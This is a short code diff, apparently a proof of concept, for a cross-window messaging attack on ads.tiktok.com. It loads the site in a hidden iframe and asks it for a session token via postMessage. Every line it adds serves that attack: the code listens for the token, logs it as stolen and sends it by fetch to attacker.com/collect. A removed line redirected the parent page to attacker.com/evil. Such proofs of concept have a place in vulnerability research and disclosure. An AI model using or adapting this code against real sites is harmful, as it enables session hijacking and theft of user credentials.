@@ -1,6 +1,24 @@
+<iframe src="https://ads.tiktok.com" id="victim" style="display:none;"></iframe>
+
 <script>
-   parent.postMessage({
-    action: "requestRedirectionTo",
-    targetUrlStr: "https://attacker.com/evil"
-}, "*");
+document.getElementById('victim').onload = function() {
+    const victimFrame = document.getElementById('victim').contentWindow;
+
+    // Step 1: Trigger the token extraction
+    victimFrame.postMessage({ action: "getSessionToken" }, "https://ads.tiktok.com");
+
+    // Step 2: Listen for the token coming back
+    window.addEventListener('message', function(e) {
+        if (e.origin !== "https://ads.tiktok.com") return; // validate origin
+
+        console.log("🎯 Stolen Token:", e.data); // should print the token
+
+        // Step 3: Exfiltrate the token
+        fetch("https://attacker.com/collect", {
+            method: "POST",
+            mode: "no-cors",
+            body: JSON.stringify({ token: e.data })
+        });
+    });
+};
 </script>
